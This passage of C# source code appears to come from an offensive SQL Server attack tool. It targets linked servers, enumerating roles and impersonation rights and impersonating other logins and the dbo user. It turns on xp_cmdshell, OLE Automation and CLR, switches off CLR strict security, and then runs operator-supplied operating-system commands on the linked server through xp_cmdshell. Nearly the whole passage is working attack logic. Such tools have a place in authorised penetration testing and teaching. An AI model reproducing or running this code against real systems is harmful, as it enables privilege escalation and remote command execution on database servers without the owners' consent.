                            command = new SqlCommand(checkclr, con);
                            reader = command.ExecuteReader();
                            while (reader.Read())
                            {
                                Int32 status = Int32.Parse(reader[0].ToString());
                                if (status == 1) Console.WriteLine("[*] clr status on " + args[1] + ": Enabled!");
                                else Console.WriteLine("clr status on " + args[1] + ": disabled");
                            }
                            reader.Close();
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[Error]" + e.Message);
                            Console.WriteLine("clr status checking failed");
                        }

                        try
                        {
                            checkclrss = "execute('select * from openquery(\"" + args[1] + "\",''SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS config_value FROM sys.configurations WHERE name = ''''clr strict security'''';'');') as login = '" + localImpersonatedLogin + "';";
                            command = new SqlCommand(checkclrss, con);
                            reader = command.ExecuteReader();
                            while (reader.Read())
                            {
                                Int32 status = Int32.Parse(reader[0].ToString());
                                if (status == 1) Console.WriteLine("clr strict security on " + args[1] + ": enabled");
                                else Console.WriteLine("[*] clr strict security on " + args[1] + ": Disabled!");
                            }
                            reader.Close();
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[Error]" + e.Message);
                            Console.WriteLine("clr strict security checking failed");
                        }

                        if (commandExecution == true)
                        {
                            try
                            {
                                Console.WriteLine("\n=====Executing commands using impersonated context " + args[0] + "\\" + localImpersonatedLogin + " on " + args[1] + "=====");

                                String execRemoteCmd = "EXEC('EXEC(''xp_cmdshell ''''" + remoteCommands + "'''';'');') as login = '" + localImpersonatedLogin + "' AT " + args[1] + ";";
                                command = new SqlCommand(execRemoteCmd, con);
                                reader = command.ExecuteReader();
                                Console.WriteLine("Remote commands executed.");
                                reader.Close();

                            }
                            catch (Exception e)
                            {
                                Console.WriteLine("[Error]" + e.Message);
                                Console.WriteLine("Command execution using " + args[0] + "\\" + localImpersonatedLogin + " on " + args[1] + " failed");
                            }
                        }
                    }
                    
                }
                else
                {
                    if (remoteImpersonation == false)
                    {
                        //using current context
                        try
                        {
                            String getVersion = "select version from openquery(\"" + args[1] + "\", 'select @@version as version;');";
                            command = new SqlCommand(getVersion, con);
                            reader = command.ExecuteReader();
                            while (reader.Read())
                            {
                                Console.WriteLine("Linked SQL server version: " + reader[0]);
                            }
                            reader.Close();
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[Error]" + e.Message);
                            Console.WriteLine("Cannot connect to Linked SQL server using current context!");
                            return;
                        }

                        querylogin = "select * from openquery(\"" + args[1] + "\",'SELECT SYSTEM_USER;');";
                        command = new SqlCommand(querylogin, con);
                        reader = command.ExecuteReader();
                        reader.Read();
                        Console.WriteLine("Logged in as: " + reader[0] + " on " + args[1]);
                        reader.Close();

                        queryuser = "select * from openquery(\"" + args[1] + "\",'SELECT USER_NAME();');";
                        command = new SqlCommand(queryuser, con);
                        reader = command.ExecuteReader();
                        reader.Read();
                        Console.WriteLine("Mapped to user: " + reader[0] + " on " + args[1]);
                        reader.Close();

                        querypublicrole = "select * from openquery(\"" + args[1] + "\",'SELECT IS_SRVROLEMEMBER(''public'');');";
                        command = new SqlCommand(querypublicrole, con);
                        reader = command.ExecuteReader();
                        reader.Read();
                        role = Int32.Parse(reader[0].ToString());
                        if (role == 1)
                        {
                            Console.WriteLine("User is a member of public role");
                        }
                        else
                        {
                            Console.WriteLine("User is NOT a member of public role");
                        }
                        reader.Close();

                        querysysadminrole = "select * from openquery(\"" + args[1] + "\",'SELECT IS_SRVROLEMEMBER(''sysadmin'');');";
                        command = new SqlCommand(querysysadminrole, con);
                        reader = command.ExecuteReader();
                        reader.Read();
                        role = Int32.Parse(reader[0].ToString());
                        if (role == 1)
                        {
                            Console.WriteLine("[*] User is a member of sysadmin role");
                        }
                        else
                        {
                            Console.WriteLine("User is NOT a member of sysadmin role");
                        }
                        reader.Close();

                        checkUserRole = "select name1, name2 from openquery(\"" + args[1] + "\",'SELECT m.name as name1, r.name as name2 FROM sys.server_role_members rm inner join sys.server_principals r on r.principal_id = rm.role_principal_id inner join sys.server_principals m on m.principal_id = rm.member_principal_id;');";
                        command = new SqlCommand(checkUserRole, con);
                        reader = command.ExecuteReader();
                        while (reader.Read() == true)
                        {
                            Console.WriteLine("User [" + reader[0] + "] is a member of [" + reader[1] + "] role on " + args[1]);
                        }
                        reader.Close();

                        //Debug
                        if (debug == true)
                        {
                            String queryLocalPrincipal = "select name from openquery(\"" + args[1] + "\",'SELECT name FROM sys.server_principals;')";
                            command = new SqlCommand(queryLocalPrincipal, con);
                            reader = command.ExecuteReader();
                            while (reader.Read() == true)
                            {
                                Console.WriteLine("[Debug] The server principals on: " + args[1] + " have :" + reader[0]);
                            }
                            reader.Close();
                        }

                        //check permission of remote LOGIN impersonation
                        String queryRemote = "select name1, name2 from openquery(\"" + args[1] + "\",'SELECT c.name as name1, b.name as name2 FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id INNER JOIN sys.server_principals c ON a.grantee_principal_id = c.principal_id WHERE a.permission_name = ''IMPERSONATE'';');";
                        command = new SqlCommand(queryRemote, con);
                        reader = command.ExecuteReader();
                        while (reader.Read() == true)
                        {
                            Console.WriteLine("[*] Server principal [" + reader[0] + "] on Server " + args[1] + " can can impersonate as LOGIN [" + reader[1] + "] on " + args[1]);
                        }
                        reader.Close();

                        try
                        {
                            Console.WriteLine("Remote LOGIN impersonation:");
                            String executeaslogin = "EXEC('execute as login = ''" + remoteImpersonatedLogin + "''; SELECT SYSTEM_USER;') AT " + args[1] + ";";
                            command = new SqlCommand(executeaslogin, con);
                            reader = command.ExecuteReader();
                            while (reader.Read() == true)
                            {
                                Console.WriteLine("Executing in the context of: " + reader[0] + " on " + args[1]);
                            }
                            reader.Close();

                            checkUserRole = "select name1, name2 from openquery(\"" + args[1] + "\",'execute as login = ''" + remoteImpersonatedLogin + "''; SELECT m.name as name1, r.name as name2 FROM sys.server_role_members rm inner join sys.server_principals r on r.principal_id = rm.role_principal_id inner join sys.server_principals m on m.principal_id = rm.member_principal_id;');";
                            command = new SqlCommand(checkUserRole, con);
                            reader = command.ExecuteReader();
                            while (reader.Read() == true)
                            {
                                Console.WriteLine("User [" + reader[0] + "] is a member of [" + reader[1] + "] role on " + args[1]);
                            }
                            reader.Close();

                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[Error]" + e.Message);
                            Console.WriteLine("Remote LOGIN impersonation as " + remoteImpersonatedLogin + " failed");
                        }

                        //Debug

                        if (debug == true)
                        {
                            command = new SqlCommand(querylogin, con);
                            reader = command.ExecuteReader();
                            reader.Read();
                            Console.WriteLine("Logged in as: " + reader[0] + " on " + args[1]);
                            reader.Close();

                            String queryDatabasePrincipal = "select name from openquery(\"" + args[1] + "\",'SELECT name FROM sys.database_principals;')";
                            command = new SqlCommand(queryDatabasePrincipal, con);
                            reader = command.ExecuteReader();
                            while (reader.Read() == true)
                            {
                                Console.WriteLine("[Debug] The database principals on: " + args[1] + " have :" + reader[0]);
                            }
                            reader.Close();
                        }

                        String queryLocal = "SELECT c.name as name1, b.name as name2 FROM sys.database_permissions a INNER JOIN sys.database_principals b ON a.grantor_principal_id = b.principal_id INNER JOIN sys.database_principals c ON a.grantee_principal_id = c.principal_id WHERE a.type = 'IM';";
                        command = new SqlCommand(queryLocal, con);
                        reader = command.ExecuteReader();
                        while (reader.Read() == true)
                        {
                            Console.WriteLine("[*] Local Database principal [" + reader[0] + "] can impersonate as USER [" + reader[1] + "] on " + args[1]);
                        }
                        reader.Close();

                        queryRemote = "select name1, name2 from openquery(\"" + args[1] + "\",'SELECT c.name as name1, b.name as name2 FROM sys.database_permissions a INNER JOIN sys.database_principals b ON a.grantor_principal_id = b.principal_id INNER JOIN sys.database_principals c ON a.grantee_principal_id = c.principal_id WHERE a.type = ''IM'';');";
                        command = new SqlCommand(queryRemote, con);
                        reader = command.ExecuteReader();
                        while (reader.Read() == true)
                        {
                            Console.WriteLine("[*] Remote Database principal [" + reader[0] + "] can impersonate as USER [" + reader[1] + "] on " + args[1]);
                        }
                        reader.Close();

                        Trustworthy = "select name from openquery(\"" + args[1] + "\",'SELECT name from sys.databases where is_trustworthy_on = 1;');";
                        command = new SqlCommand(Trustworthy, con);
                        reader = command.ExecuteReader();
                        while (reader.Read() == true)
                        {
                            Console.WriteLine("[*] Database with Trustworthy enabled on " + args[1] + ": " + reader[0]);
                        }
                        reader.Close();

                        try
                        {
                            Console.WriteLine("USER dbo impersonation:");
                            String executeasuser = "EXEC('execute as USER = ''dbo''; SELECT USER_NAME();') AT " + args[1] + ";";
                            command = new SqlCommand(executeasuser, con);
                            reader = command.ExecuteReader();
                            while (reader.Read() == true)
                            {
                                Console.WriteLine("Executing in the context of: " + reader[0] + " on " + args[1]);
                            }
                            reader.Close();
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[Error]" + e.Message);
                            Console.WriteLine("USER dbo impersonation failed");
                        }

                        execCmd = "select * from openquery(\"" + args[1] + "\",'EXEC sp_linkedservers;');";
                        command = new SqlCommand(execCmd, con);
                        reader = command.ExecuteReader();
                        while (reader.Read())
                        {
                            Console.WriteLine("Linked SQL Server on: " + args[1] + " have :" + reader[0]);
                        }
                        reader.Close();

                        linked_logins = "select name1, name2, name3 from openquery(\"" + args[1] + "\",'SELECT sp.name as name1, s.name as name2, ll.remote_name as name3 FROM sys.linked_logins ll INNER JOIN sys.server_principals sp ON ll.local_principal_id = sp.principal_id INNER JOIN sys.servers s ON s.server_id = ll.server_id;');";
                        command = new SqlCommand(linked_logins, con);
                        reader = command.ExecuteReader();
                        while (reader.Read())
                        {
                            Console.WriteLine("Server principal " + reader[0] + " on Server " + args[1] + " linked to remote Server " + reader[1] + " as Remote user name: " + reader[2]);
                        }
                        reader.Close();

                        //Check advanced functions using current context
                        Console.WriteLine("\n=====Check advanced functions using current context on " + args[1] + "=====");

                        String enableAdv = "EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT " + args[1] + ";";
                        String enableAdvImper = "EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT " + args[1] + ";";

                        try
                        {
                            String enableShell = "EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT " + args[1] + ";";
                            command = new SqlCommand(enableAdv, con);
                            reader = command.ExecuteReader();
                            reader.Close();
                            command = new SqlCommand(enableShell, con);
                            reader = command.ExecuteReader();
                            reader.Close();
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[Error]" + e.Message);
                            Console.WriteLine("xp_cmdshell enable failed");
                        }

                        try
                        {
                            checkshell = "select * from openquery(\"" + args[1] + "\",'SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS config_value FROM sys.configurations WHERE name = ''xp_cmdshell'';');";
                            command = new SqlCommand(checkshell, con);
                            reader = command.ExecuteReader();
                            while (reader.Read())
                            {
                                Int32 status = Int32.Parse(reader[0].ToString());
                                if (status == 1) Console.WriteLine("[*] xp_cmdshell status on " + args[1] + ": Enabled!");
                                else Console.WriteLine("xp_cmdshell status on " + args[1] + ": disabled");
                            }
                            reader.Close();
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[Error]" + e.Message);
                            Console.WriteLine("xp_cmdshell status checking failed");
                        }

                        try
                        {
                            String enableOle = "EXEC ('sp_configure ''Ole Automation Procedures'', 1; RECONFIGURE;') AT " + args[1] + ";";
                            command = new SqlCommand(enableAdv, con);
                            reader = command.ExecuteReader();
                            reader.Close();
                            command = new SqlCommand(enableOle, con);
                            reader = command.ExecuteReader();
                            reader.Close();
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[Error]" + e.Message);
                            Console.WriteLine("Ole enable failed");
                        }

                        try
                        {
                            checkOle = "select * from openquery(\"" + args[1] + "\",'SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS config_value FROM sys.configurations WHERE name = ''Ole Automation Procedures'';');";
                            command = new SqlCommand(checkOle, con);
                            reader = command.ExecuteReader();
                            while (reader.Read())
                            {
                                Int32 status = Int32.Parse(reader[0].ToString());
                                if (status == 1) Console.WriteLine("[*] Ole Automation Procedures status on " + args[1] + ": Enabled!");
                                else Console.WriteLine("Ole Automation Procedures status on " + args[1] + ": disabled");
                            }
                            reader.Close();
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[Error]" + e.Message);
                            Console.WriteLine("Ole Automation Procedures status checking failed");
                        }
                        try
                        {
                            String enableclr1 = "EXEC ('sp_configure ''clr enabled'', 1; RECONFIGURE;') AT " + args[1] + ";";
                            command = new SqlCommand(enableclr1, con);
                            reader = command.ExecuteReader();
                            reader.Close();

                            String enableclr2 = "EXEC ('sp_configure ''clr strict security'', 0; RECONFIGURE;') AT " + args[1] + ";";
                            command = new SqlCommand(enableclr2, con);
                            reader = command.ExecuteReader();
                            reader.Close();
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[Error]" + e.Message);
                            Console.WriteLine("clr enable failed");
                        }

                        try
                        {
                            checkclr = "select * from openquery(\"" + args[1] + "\",'SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS config_value FROM sys.configurations WHERE name = ''clr enabled'';');";
                            command = new SqlCommand(checkclr, con);
                            reader = command.ExecuteReader();
                            while (reader.Read())
                            {
                                Int32 status = Int32.Parse(reader[0].ToString());
                                if (status == 1) Console.WriteLine("[*] clr status on " + args[1] + ": Enabled!");
                                else Console.WriteLine("clr status on " + args[1] + ": disabled");
                            }
                            reader.Close();
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[Error]" + e.Message);
                            Console.WriteLine("clr status checking failed");
                        }

                        try
                        {
                            checkclrss = "select * from openquery(\"" + args[1] + "\",'SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS config_value FROM sys.configurations WHERE name = ''clr strict security'';');";
                            command = new SqlCommand(checkclrss, con);
                            reader = command.ExecuteReader();
                            while (reader.Read())
                            {
                                Int32 status = Int32.Parse(reader[0].ToString());
                                if (status == 1) Console.WriteLine("clr strict security on " + args[1] + ": enabled");
                                else Console.WriteLine("[*] clr strict security on " + args[1] + ": Disabled!");
                            }
                            reader.Close();
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[Error]" + e.Message);
                            Console.WriteLine("clr strict security checking failed");
                        }

                        if (commandExecution == true)
                        {
                            try
                            {
                                Console.WriteLine("\n=====Executing commands using current context on " + args[1] + "=====");

                                String execRemoteCmd = "EXEC('EXEC(''xp_cmdshell ''''" + remoteCommands + "'''';'');') AT " + args[1] + ";";
                                command = new SqlCommand(execRemoteCmd, con);
                                reader = command.ExecuteReader();
                                Console.WriteLine("Remote commands executed.");
                                reader.Close();
                            }
                            catch (Exception e)
                            {
                                Console.WriteLine("[Error]" + e.Message);
                                Console.WriteLine("Command execution using current context on " + args[1] + " failed");
                            }
                        }
                    }
                    
                    //Check advanced functions using impersonated context on remote server, for e.g. sqluser is a remote user which can be impersonated on remote server
                    else
                    {
                        Console.WriteLine("\n=====Check advanced functions using impersonated context " + args[1] + "\\" + remoteImpersonatedLogin + " on " + args[1] + "=====");

                        try
                        {
                            String enableCmdShell = "EXEC('execute as login = ''" + remoteImpersonatedLogin + "''; EXEC(''sp_configure ''''xp_cmdshell'''', 1''); RECONFIGURE;') AT " + args[1] + ";";
                            command = new SqlCommand(enableCmdShell, con);
                            reader = command.ExecuteReader();
                            reader.Close();
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[Error]"+e.Message);
                            Console.WriteLine("xp_cmdshell enable failed");
                        }

                        try
                        {
                            checkshell = "EXEC('execute as login = ''" + remoteImpersonatedLogin + "'';') AT " + args[1] + ";select * from openquery(\"" + args[1] + "\",'SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS config_value FROM sys.configurations WHERE name = ''xp_cmdshell'';');";
                            command = new SqlCommand(checkshell, con);
                            reader = command.ExecuteReader();
                            while (reader.Read())
                            {
                                Int32 status = Int32.Parse(reader[0].ToString());
                                if (status == 1) Console.WriteLine("[*] xp_cmdshell status on " + args[1] + ": Enabled!");
                                else Console.WriteLine("xp_cmdshell status on " + args[1] + ": disabled");
                            }
                            reader.Close();
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[Error]"+e.Message);
                            Console.WriteLine("xp_cmdshell status checking failed");
                        }


                        try
                        {
                            String enableCmdShell = "EXEC('execute as login = ''" + remoteImpersonatedLogin + "''; EXEC(''sp_configure ''''Ole Automation Procedures'''', 1''); RECONFIGURE;') AT " + args[1] + ";";
                            command = new SqlCommand(enableCmdShell, con);
                            reader = command.ExecuteReader();
                            reader.Close();
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[Error]"+e.Message);
                            Console.WriteLine("Ole Automation Procedures enable failed");
                        }

                        try
                        {
                            checkshell = "EXEC('execute as login = ''" + remoteImpersonatedLogin + "'';') AT " + args[1] + ";select * from openquery(\"" + args[1] + "\",'SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS config_value FROM sys.configurations WHERE name = ''Ole Automation Procedures'';');";
                            command = new SqlCommand(checkshell, con);
                            reader = command.ExecuteReader();
                            while (reader.Read())
                            {
                                Int32 status = Int32.Parse(reader[0].ToString());
                                if (status == 1) Console.WriteLine("[*] Ole Automation Procedures status on " + args[1] + ": Enabled!");
                                else Console.WriteLine("Ole Automation Procedures status on " + args[1] + ": disabled");
                            }
                            reader.Close();
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[Error]"+e.Message);
                            Console.WriteLine("Ole Automation Procedures status checking failed");
                        }

                        try
                        {
                            String enableCmdShell = "EXEC('execute as login = ''" + remoteImpersonatedLogin + "''; EXEC(''sp_configure ''''clr enabled'''', 1''); RECONFIGURE; EXEC(''sp_configure ''''clr strict security'''', 0''); RECONFIGURE;') AT " + args[1] + ";";
                            command = new SqlCommand(enableCmdShell, con);
                            reader = command.ExecuteReader();
                            reader.Close();
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[Error]"+e.Message);
                            Console.WriteLine("clr enable failed");
                        }

                        try
                        {
                            checkshell = "EXEC('execute as login = ''" + remoteImpersonatedLogin + "'';') AT " + args[1] + ";select * from openquery(\"" + args[1] + "\",'SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS config_value FROM sys.configurations WHERE name = ''clr enabled'';');";
                            command = new SqlCommand(checkshell, con);
                            reader = command.ExecuteReader();
                            while (reader.Read())
                            {
                                Int32 status = Int32.Parse(reader[0].ToString());
                                if (status == 1) Console.WriteLine("[*] clr enabled status on " + args[1] + ": Enabled!");
                                else Console.WriteLine("clr enabled status on " + args[1] + ": disabled");
                            }
                            reader.Close();
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[Error]"+e.Message);
                            Console.WriteLine("clr enabled status checking failed");
                        }

                        try
                        {
                            checkshell = "EXEC('execute as login = ''" + remoteImpersonatedLogin + "'';') AT " + args[1] + ";select * from openquery(\"" + args[1] + "\",'SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS config_value FROM sys.configurations WHERE name = ''clr strict security'';');";
                            command = new SqlCommand(checkshell, con);
                            reader = command.ExecuteReader();
                            while (reader.Read())
                            {
                                Int32 status = Int32.Parse(reader[0].ToString());
                                if (status == 1) Console.WriteLine("clr strict security enabled status on " + args[1] + ": enabled.");
                                else Console.WriteLine("[*] clr strict security enabled status on " + args[1] + ": Disabled!");
                            }
                            reader.Close();
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[Error]"+e.Message);
                            Console.WriteLine("clr strict security status checking failed");
                        }
                        if(commandExecution == true)
                        {
                            try
                            {
                                Console.WriteLine("\n=====Executing commands using impersonated context " + args[1] + "\\" + remoteImpersonatedLogin + " on " + args[1] + "=====");

                                String execRemoteCmd = "EXEC('execute as login = ''" + remoteImpersonatedLogin + "''; EXEC(''xp_cmdshell ''''" + remoteCommands + "'''';'');') AT " + args[1] + ";";
                                command = new SqlCommand(execRemoteCmd, con);
                                reader = command.ExecuteReader();
                                Console.WriteLine("Remote commands executed.");
                                reader.Close();
                            }
                            catch (Exception e)
                            {
                                Console.WriteLine("[Error]" + e.Message);
                                Console.WriteLine("Command execution using " + args[1] + "\\" + remoteImpersonatedLogin + " on " + args[1] + " failed");
                            }
                        }
                    }
                }
            }
            con.Close();
        }
    }
}
